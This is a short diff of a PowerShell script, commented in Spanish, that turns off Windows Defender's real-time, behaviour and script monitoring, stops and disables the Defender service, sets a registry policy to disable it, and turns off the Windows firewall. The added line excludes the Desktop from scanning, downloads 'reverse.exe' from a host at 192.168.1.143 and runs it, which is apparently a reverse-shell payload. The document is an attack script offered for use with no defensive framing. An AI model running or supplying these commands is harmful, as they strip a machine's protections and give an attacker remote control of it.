@@ -1,6 +1,7 @@
 #Desactivar Monitorización de Windows Defender (no 100%).
 Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
 
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ;Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:USERPROFILE\Desktop\rs.exe"; powershell "$env:USERPROFILE\Desktop\rs.exe"
 
 #Desactivar Firewall
 netsh advfirewall set allprofiles state off
